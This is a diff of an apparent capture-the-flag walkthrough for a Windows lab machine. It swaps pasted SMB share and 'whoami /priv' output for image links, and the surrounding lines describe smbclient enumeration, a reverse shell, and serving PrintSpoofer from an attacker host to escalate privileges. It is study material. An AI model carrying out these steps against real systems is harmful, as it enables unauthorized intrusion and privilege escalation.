@@ -10,15 +10,7 @@ smbclient -L \\\\10.10.230.202
 
 We get shares as below:
 
-DragExtra keys
-Clipboard
-Clipboard
-Sharename       Type      Comment
----------       ----      -------
-ADMIN$          Disk      Remote Admin
-C$              Disk      Default share
-IPC$            IPC       Remote IPC
-nt4wrksv        Disk      
+![image](https://github.com/vivekprm/hackers-manual/assets/2403660/df603222-2a58-4770-b6f6-60cd76fe7c74)    
 
 We got a web share nt4wrksv. We can try to access it like below:
 ```
@@ -57,15 +49,7 @@ In windows there was a vulnerability discovered calle [PrintSpoofer](https://git
 c:\windows\system32\inetsrv>whoami /priv
 ```
 
-Privilege Name                Description                               State   
-============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeAuditPrivilege              Generate security audits                  Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+![image](https://github.com/vivekprm/hackers-manual/assets/2403660/f6270bee-9a1c-4b3b-bc8d-cd83458791fb)
 
 So what we can do is on attacker machine download printspoofer.exe and serve using python htttp server and from reverse shell run below:
 ```
